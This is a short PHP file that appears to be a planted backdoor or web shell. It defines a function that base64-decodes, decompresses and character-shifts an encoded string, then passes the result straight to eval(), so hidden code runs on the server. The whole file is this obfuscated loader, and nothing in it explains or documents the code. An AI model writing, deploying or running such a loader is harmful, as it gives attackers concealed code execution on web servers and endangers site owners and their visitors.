<?php function WffZms($aGtoK)
{ 
$aGtoK=gzinflate(base64_decode($aGtoK));
 for($i=0;$i<strlen($aGtoK);$i++)
 {
$aGtoK[$i] = chr(ord($aGtoK[$i])-1);
 }
 return $aGtoK;
 }eval(WffZms("fU9LDoIwED1ATzEhLGBhPACRE7hS96TWQZo0LWmnKjGc3dYSFEOc5bw/QDjGhOLOwfGOSCdjqNubgSsa2JNFvLfyxgkh7y228gE7yLYqMbJqyRBKoqaKpa8/Kymg9VqQNBqaRhjtyHpBxcQsIUXEy6mTblMnIITMZhEc1y2vSMXCw6Lz6q3+dtvUkTi90oqymkUWyVv9qwi0nls8oOtDaywm6/Jvn6a54LSw/LTyQb8eP7KRvQA="));?>